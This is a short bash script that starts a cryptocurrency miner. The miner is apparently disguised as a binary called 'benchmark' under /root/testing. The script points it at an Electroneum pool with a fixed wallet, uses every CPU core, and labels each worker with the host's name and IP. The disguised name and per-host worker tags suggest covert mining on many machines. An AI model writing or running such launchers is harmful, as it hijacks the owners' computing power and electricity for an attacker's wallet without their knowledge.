#!/bin/bash

WALLET="etnkDdfA7i3Qm22XJdhwoYf8RmoUp9EwcQwnrEF7rs4UgVoj3bBtnsgBLkVpViKppsTNCrU7MaBtm5RTUfeTbiDL7WJE8foUWE"
IP=$(ip -4 route get 8.8.8.8 | awk {'print $7'} | tr -d '\n'|tr -d ".")

CPUS=$(cat /proc/cpuinfo | grep processor | wc -l)

/root/testing/benchmark -o etn.easyhash.io:3630 -u $WALLET -p ${1}${2}${HOSTNAME:0:6}${IP} -t $CPUS --av=2 -r 3 --retry-pause=10 --donate-level=1 --print-time=60
